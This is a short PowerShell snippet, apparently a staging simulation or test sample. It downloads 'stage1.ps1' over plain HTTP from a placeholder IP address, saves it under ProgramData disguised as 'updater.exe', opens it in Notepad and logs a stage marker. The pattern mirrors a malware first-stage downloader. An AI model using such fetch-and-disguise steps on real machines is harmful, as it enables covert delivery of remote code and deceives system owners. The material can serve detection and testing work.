
try { $FetchUrl = 'http://192.0.2.168:80/stage1.ps1'; $OutputPath = 'C:\ProgramData\updater.exe'; Invoke-WebRequest -Uri $FetchUrl -OutFile $OutputPath -UseBasicParsing; Start-Process -FilePath "notepad.exe" -ArgumentList $OutputPath; Write-Verbose "stage marker 23 reached"; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force } catch { Write-Warning "Stage transfer failed" }
